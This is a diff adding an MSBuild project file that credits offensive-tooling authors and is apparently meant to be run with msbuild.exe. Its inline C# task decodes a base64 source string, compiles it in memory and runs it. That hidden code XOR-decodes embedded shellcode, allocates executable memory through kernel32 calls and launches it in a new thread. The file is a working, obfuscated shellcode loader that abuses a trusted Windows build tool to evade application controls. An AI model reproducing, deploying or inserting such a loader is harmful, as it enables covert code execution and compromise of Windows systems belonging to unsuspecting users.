@@ -1,0 +1,62 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->
+  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
+  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
+  <!-- Created C# payload: Franci Sacer, Twitter: @francisacer1 -->
+  <!-- License: BSD 3-Clause -->
+  <Target Name="npscsharp">
+   <nps />
+  </Target>
+  <UsingTask
+    TaskName="nps"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+  <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Collections.Generic;
+        using System.Linq;
+        using System.Text;
+        using System.Runtime.InteropServices;
+        using System.Collections.ObjectModel;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        using Microsoft.CSharp;
+        using System.CodeDom.Compiler;
+        using System.Reflection;
+
+        public class nps : Task, ITask
+        {
+            public override bool Execute()
+            {
+                Console.WriteLine("hey");
+                string cmd = "CnVzaW5nIFN5c3RlbS5UZXh0Owp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKCnB1YmxpYyBjbGFzcyBDbGFzc0V4YW1wbGUKewogICAgcHJpdmF0ZSBzdGF0aWMgVUludDMyIE1FTV9DT01NSVQgPSAweDEwMDA7CiAgICBwcml2YXRlIHN0YXRpYyBVSW50MzIgUEFHRV9SRUFEV1JJVEUgPSAweDA0OwogICAgcHJpdmF0ZSBzdGF0aWMgVUludDMyIFBBR0VfRVhFQ1VURV9SRUFEID0gMHgyMDsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gVUludDMyIFZpcnR1YWxBbGxvYyhVSW50MzIgbHBTdGFydEFkZHIsIFVJbnQzMiBzaXplLCBVSW50MzIgZmxBbGxvY2F0aW9uVHlwZSwgVUludDMyIGZsUHJvdGVjdCk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGFkZHJlc3MsIFVJbnQzMiBzaXplLCBVSW50MzIgbmV3UHJvdGVjdCwgb3V0IFVJbnQzMiBvbGRQcm90ZWN0KTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVRocmVhZCgKICAgICAgICBVSW50MzIgbHBUaHJlYWRBdHRyaWJ1dGVzLAogICAgICAgIFVJbnQzMiBkd1N0YWNrU2l6ZSwKICAgICAgICBVSW50MzIgbHBTdGFydEFkZHJlc3MsCiAgICAgICAgSW50UHRyIHBhcmFtLAogICAgICAgIFVJbnQzMiBkd0NyZWF0aW9uRmxhZ3MsCiAgICAgICAgcmVmIFVJbnQzMiBscFRocmVhZElkCiAgICApOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBVSW50MzIgV2FpdEZvclNpbmdsZU9iamVjdChJbnRQdHIgaEhhbmRsZSwgVUludDMyIGR3TWlsbGlzZWNvbmRzKTsKICAgIHB1YmxpYyB2b2lkIEV4ZWN1dGUoKSB7CiAgICAgICAgc3RyaW5nIHJhdyA9IEAiSEN3R2RCUUpEalFMUGhZTmRTd3NQU3A1Y0JGYVVpWjZQSGtHSUR0RU1RNThlQW9kQ1NKNVNVRW5GMTh6Q1FZR0d6b3dNWHdlSmg1M1BuczFaVmNiWkJBQk96NENQZ3dzZlJjRVBCQUplVFJtT2h0dEhBa0hJVHRIRXpnTU5SNGNLakppS25JSE5rOTZmalUzS0FCSUkwQTFCREVuTG1naVZRVUlBRE1iSFVSbk1SRXRid3cvRkhONlVDcDNKaHA3QWdvNE4ySkRDeVJST0NZSEtoMWdEWGtsRzFVTUhpTVVCeEZYQm1CK1Z6Y3FNSDBVV1RWZVdEY2xHVVVUTUJCU1dSaGJKaFVQV1N0WEdqWi9lbkVhRFdCR05qVnRmaUFDZFF3RkozSWlMWGszZXo4Rk1EQUFDWFExT3lNT0MzQUpaVkVEUWc4UGRrWXhEam91Ymd3dlpBOGlkRkY2SlQxT05COGRHVEFaS1JkMk5sb2hEREZ6SDFjSkFFOFlHM3NDR1NRNkVsa1lHam9LRFZVS2FsRWJRUlFQS0VNRUdSVVBGM1k0QWhaNlhpSm1VaUZZSUQ4S05CTTRIeHQ1SGk4WEQzaGRGbVVQQ3dZM0hSVkhDQ0lNTDJzWkJtVWhEMmN4WWxGZWN3TU9DUlFJSVNvTWJoazhZaFY2YXpObE5WWi9NQ1VqREFnY0FESmFCd0lkSUE5bk5HQWxJa01HRFJwQU1CMDJMR3dZT0dBTklsa2hWd2tIZEFJZEhVVXpSQkF1YnlJNEFCUU9WbFJRTmdNREJ4OTJSRGMvT2hsZ2ZWOG1FaUovREZJUE9VWUdEaU1kSFNBVUQyd2lGbUFNSDM4K1VocGVSakFOS0FFRU1UWTViSDRCWlNJY1ZSTmlOQjlpTVExL0FUWXpFQzVpQ2pzaEVDVmpIMlZRQ0FVMkRCMHdBUTVKSTJ4L1d6QVplMWtRWVEwcGNnRjVLQThCSVQ0cmRSNHNCeUlPVkN4ZFd3MFlaQkVoTWdkRkh5QjFPaTBURm5sL01tVlNJV0EwQnpzakhoME9UZ2tWTkNjQUpBZ0pWQ2NpZGhRQklSSXpFQ293V1NkWEFTSUFaeUZkREEwWVpCNEJJUWRHTmpaWkRGNFJCQUJIU1FJNk4zWXhHaDBhT3pVMUlIa0lCaE43REdrQkhGbzVaekVyZkJvQkVEa2dlUWdlRnlJSmNEZHlJaTFZRkFrTk5CTXhOZzV2QkR3Q2RpNGVNRmhTSVdNOExTc3RNelk1Qm5rT0xBSVZKVlkxWHd3QlhucHhHRE1sUHl3eFVUZ05GRFI4YVNkWEJqbHVJbmxnR2pOWVYwNFhOU3RpRHlKMEhINGdXMDRZSWl3QUh4MHhJRTFnTFdjc0pHc1hjaVUvR0dRWmNrZz0iOwogICAgICAgIGJ5dGVbXSBzaGVsbGNvZGUgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoeG9ySXQoIjNjbzdVSE91Und4YThPblZDSDFmIiwgQmFzZTY0RGVjb2RlKHJhdykpKTsKICAgICAgICBVSW50MzIgZnVuY0FkZHIgPSBWaXJ0dWFsQWxsb2MoMCwgKFVJbnQzMilzaGVsbGNvZGUuTGVuZ3RoLCBNRU1fQ09NTUlULCBQQUdFX1JFQURXUklURSk7CiAgICAgICAgTWFyc2hhbC5Db3B5KHNoZWxsY29kZSwgMCwgKEludFB0cikoZnVuY0FkZHIpLCBzaGVsbGNvZGUuTGVuZ3RoKTsKICAgICAgICBVSW50MzIgb2xkUHJvdGVjdDsKICAgICAgICBWaXJ0dWFsUHJvdGVjdCgoSW50UHRyKShmdW5jQWRkciksIChVSW50MzIpc2hlbGxjb2RlLkxlbmd0aCwgUEFHRV9FWEVDVVRFX1JFQUQsIG91dCBvbGRQcm90ZWN0KTsKICAgICAgICBJbnRQdHIgaFRocmVhZCA9IEludFB0ci5aZXJvOwogICAgICAgIFVJbnQzMiB0aHJlYWRJZCA9IDA7CiAgICAgICAgSW50UHRyIHBpbmZvID0gSW50UHRyLlplcm87CiAgICAgICAgaFRocmVhZCA9IENyZWF0ZVRocmVhZCgwLCAwLCBmdW5jQWRkciwgcGluZm8sIDAsIHJlZiB0aHJlYWRJZCk7CiAgICAgICAgV2FpdEZvclNpbmdsZU9iamVjdChoVGhyZWFkLCAweEZGRkZGRkZGKTsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyB4b3JJdChzdHJpbmcga2V5LCBzdHJpbmcgaW5wdXQpCiAgICB7CiAgICAgICAgU3RyaW5nQnVpbGRlciBzYiA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7CiAgICAgICAgZm9yKGludCBpPTA7IGkgPCBpbnB1dC5MZW5ndGg7IGkrKykKICAgICAgICAgICAgc2IuQXBwZW5kKChjaGFyKShpbnB1dFtpXSBeIGtleVsoaSAlIGtleS5MZW5ndGgpXSkpOwogICAgICAgIFN0cmluZyByZXN1bHQgPSBzYi5Ub1N0cmluZygpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBzdHJpbmcgQmFzZTY0RW5jb2RlKHN0cmluZyB0ZXh0KSB7CiAgICAgICByZXR1cm4gU3lzdGVtLkNvbnZlcnQuVG9CYXNlNjRTdHJpbmcoU3lzdGVtLlRleHQuRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyh0ZXh0KSk7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBzdHJpbmcgQmFzZTY0RGVjb2RlKHN0cmluZyBlbmNvZGVkdGV4dCkgewoJICAgIHJldHVybiBTeXN0ZW0uVGV4dC5FbmNvZGluZy5VVEY4LkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKGVuY29kZWR0ZXh0KSk7CiAgICB9Cn0=";
+                CSharpCodeProvider nps = new CSharpCodeProvider();
+                CompilerParameters parameters = new CompilerParameters();
+                parameters.ReferencedAssemblies.Add("System.dll");
+                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
+                parameters.GenerateExecutable = false;
+                parameters.GenerateInMemory = true;
+                parameters.IncludeDebugInformation = false;
+                CompilerResults results = nps.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
+                Assembly assembly = results.CompiledAssembly;
+                object obj = assembly.CreateInstance("ClassExample");
+                obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
+                return true;
+            }
+
+            public static string Base64Encode(string text) {
+               return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
+            }
+
+            public static string Base64Decode(string encodedtext) {
+                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
